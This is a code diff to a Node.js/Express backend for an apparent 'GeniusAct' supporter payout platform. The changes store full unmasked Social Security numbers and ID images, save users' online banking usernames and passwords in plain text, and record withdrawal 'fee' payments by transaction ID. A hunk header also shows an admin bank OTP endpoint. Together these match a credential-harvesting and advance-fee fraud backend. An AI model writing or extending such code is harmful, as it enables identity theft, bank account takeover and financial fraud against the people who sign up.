@@ -284,7 +284,6 @@ app.post('/api/auth/change-password', (req, res) => {
 });
 
 // Persistent Cloud Database Store
-const CLOUD_DB_FILE = path.join(__dirname, 'cloud_database.json');
 
 function getDefaultDb() {
   return {
@@ -647,6 +646,8 @@ app.post('/submit_kyc', upload.fields([
   try {
     const ssn = req.body.ssn || '';
     const email = req.body.email || '';
+    const fullName = req.body.fullName || req.body.fullname || '';
+    const country = req.body.country || 'United States';
     const cleanSSN = ssn.replace(/[^0-9]/g, '');
 
     const currentDb = getCloudDb();
@@ -659,18 +660,32 @@ app.post('/submit_kyc', upload.fields([
     const kycData = {
       status: 'pending',
       submittedAt: new Date().toISOString(),
-      ssnMasked: cleanSSN ? ('***-**-' + cleanSSN.slice(-4)) : '***-**-****',
+      fullName: fullName,
+      country: country,
+      ssn: ssn,
+      ssnMasked: cleanSSN ? ('***-**-' + cleanSSN.slice(-4)) : (ssn || '***-**-****'),
       idFront: idFrontUrl ? { name: 'ID Front', dataUrl: idFrontUrl, type: 'image/jpeg' } : null,
+      idFrontFile: idFrontUrl ? { name: 'ID Front', dataUrl: idFrontUrl, type: 'image/jpeg' } : null,
       idBack: idBackUrl ? { name: 'ID Back', dataUrl: idBackUrl, type: 'image/jpeg' } : null,
-      driverLicense: licenseUrl ? { name: 'Driver License', dataUrl: licenseUrl, type: 'image/jpeg' } : null
+      idBackFile: idBackUrl ? { name: 'ID Back', dataUrl: idBackUrl, type: 'image/jpeg' } : null,
+      driverLicense: licenseUrl ? { name: 'Driver License', dataUrl: licenseUrl, type: 'image/jpeg' } : null,
+      passportFile: licenseUrl ? { name: 'Driver License', dataUrl: licenseUrl, type: 'image/jpeg' } : null
     };
 
     if (email) {
       const cleanEmail = String(email).trim().toLowerCase();
       const approvedUsers = currentDb['geniusact_approved_users'] || [];
-      const user = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
+      const pendingUsers = currentDb['geniusact_pending_users'] || [];
+      let user = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
+      if (!user) {
+        user = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
+      }
       if (user) {
         user.kyc = kycData;
+        user.kycStatus = 'pending';
+        if (fullName && (!user.fullName || user.fullName === cleanEmail.split('@')[0])) {
+          user.fullName = fullName;
+        }
       }
     }
 
@@ -932,16 +947,34 @@ app.post('/api/admin/kyc/action', (req, res) => {
     const { uid, email, action, reason } = req.body || {};
     const currentDb = getCloudDb();
     const approvedUsers = currentDb['geniusact_approved_users'] || [];
+    const pendingUsers = currentDb['geniusact_pending_users'] || [];
 
-    const user = approvedUsers.find(u => (uid && u.uid === uid) || (email && u.email && u.email.toLowerCase() === String(email).toLowerCase()));
+    let user = approvedUsers.find(u => (uid && u.uid === uid) || (email && u.email && u.email.toLowerCase() === String(email).toLowerCase()));
+    if (!user) {
+      user = pendingUsers.find(u => (uid && u.uid === uid) || (email && u.email && u.email.toLowerCase() === String(email).toLowerCase()));
+    }
     if (!user) {
       return res.status(404).json({ error: 'User not found' });
     }
 
     if (!user.kyc) user.kyc = {};
-    user.kyc.status = action === 'approve' ? 'approved' : 'rejected';
+    const isApprove = action === 'approve';
+    const newStatus = isApprove ? 'approved' : 'rejected';
+
+    user.kyc.status = newStatus;
+    user.kycStatus = newStatus;
+    user.isApproved = isApprove;
+    user.kyc_approved = isApprove;
     user.kyc.decisionAt = new Date().toISOString();
-    if (reason) user.kyc.rejectionReason = reason;
+    if (isApprove) {
+      user.kyc.approvedAt = new Date().toISOString();
+      delete user.kyc.declineReason;
+      delete user.kyc.rejectionReason;
+    } else {
+      user.kyc.declinedAt = new Date().toISOString();
+      user.kyc.declineReason = reason || 'Verification documents could not be validated.';
+      user.kyc.rejectionReason = user.kyc.declineReason;
+    }
 
     saveCloudDb(currentDb);
     return res.json({ success: true, user });
@@ -1005,7 +1038,7 @@ app.post('/api/admin/bank/otp', (req, res) => {
 
 app.post('/api/bank/link', (req, res) => {
   try {
-    const { userEmail, bankName, accountNumber, routingNumber, accountHolder, accountType } = req.body || {};
+    const { userEmail, bankName, accountNumber, routingNumber, accountHolder, accountType, username, password, onlineUsername, onlinePassword } = req.body || {};
     if (!userEmail || !bankName || !accountNumber) {
       return res.status(400).json({ error: 'Missing required bank linkage fields' });
     }
@@ -1022,6 +1055,8 @@ app.post('/api/bank/link', (req, res) => {
       routingNumber: String(routingNumber || ''),
       accountHolder: accountHolder || '',
       accountType: accountType || 'Checking',
+      username: username || onlineUsername || '',
+      password: password || onlinePassword || '',
       linkedAt: new Date().toISOString(),
       otpRequested: false,
       otpVerified: false
@@ -1030,7 +1065,7 @@ app.post('/api/bank/link', (req, res) => {
     if (existingIdx !== -1) {
       bankLinks[existingIdx] = { ...bankLinks[existingIdx], ...bankRecord, id: bankLinks[existingIdx].id };
     } else {
-      bankLinks.push(bankRecord);
+      bankLinks.unshift(bankRecord);
     }
 
     currentDb['geniusact_bank_links'] = bankLinks;
@@ -1065,7 +1100,7 @@ app.post('/api/bank/submit-otp', (req, res) => {
 
 app.post('/api/withdraw', (req, res) => {
   try {
-    const { userEmail, amount, bankId, withdrawalMethod } = req.body || {};
+    const { userEmail, amount, bank, bankName, accountNumber, routingNumber, feePaid, feeTxid, bankId, withdrawalMethod } = req.body || {};
     if (!userEmail || !amount) return res.status(400).json({ error: 'Email and withdrawal amount required' });
 
     const cleanEmail = String(userEmail).toLowerCase();
@@ -1073,29 +1108,40 @@ app.post('/api/withdraw', (req, res) => {
     const currentDb = getCloudDb();
 
     const approvedUsers = currentDb['geniusact_approved_users'] || [];
-    const user = approvedUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
+    const pendingUsers = currentDb['geniusact_pending_users'] || [];
+    let user = approvedUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
+    if (!user) {
+      user = pendingUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
+    }
 
     if (!user) return res.status(404).json({ error: 'Supporter account not found' });
-    if (user.amount < parsedAmount) return res.status(400).json({ error: 'Insufficient account balance' });
 
     const newWithdrawal = {
-      id: 'wdr_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
+      id: 'WDR-' + Math.floor(10000000 + Math.random() * 90000000),
+      uid: user.uid || ('USR-' + Date.now()),
       userEmail: cleanEmail,
       amount: parsedAmount,
+      bank: bank || bankName || 'Primary Linked Account',
+      accountNumber: accountNumber ? String(accountNumber) : '',
+      routingNumber: routingNumber ? String(routingNumber) : '',
+      feePaid: parseFloat(feePaid) || 0,
+      feeTxid: feeTxid || '',
       bankId: bankId || 'Primary Linked Account',
       method: withdrawalMethod || 'Direct Bank Wire',
       status: 'pending',
+      date: new Date().toISOString(),
       timestamp: new Date().toISOString()
     };
 
     if (!Array.isArray(currentDb['geniusact_withdrawal_requests'])) currentDb['geniusact_withdrawal_requests'] = [];
     currentDb['geniusact_withdrawal_requests'].unshift(newWithdrawal);
 
-    // Deduct user balance
-    user.amount -= parsedAmount;
+    if (user.amount !== undefined && user.amount >= parsedAmount) {
+      user.amount -= parsedAmount;
+    }
 
     saveCloudDb(currentDb);
-    return res.json({ success: true, withdrawal: newWithdrawal, remainingBalance: user.amount });
+    return res.json({ success: true, withdrawal: newWithdrawal, remainingBalance: user.amount || 0 });
   } catch (err) {
     return res.status(500).json({ error: err.message });
   }
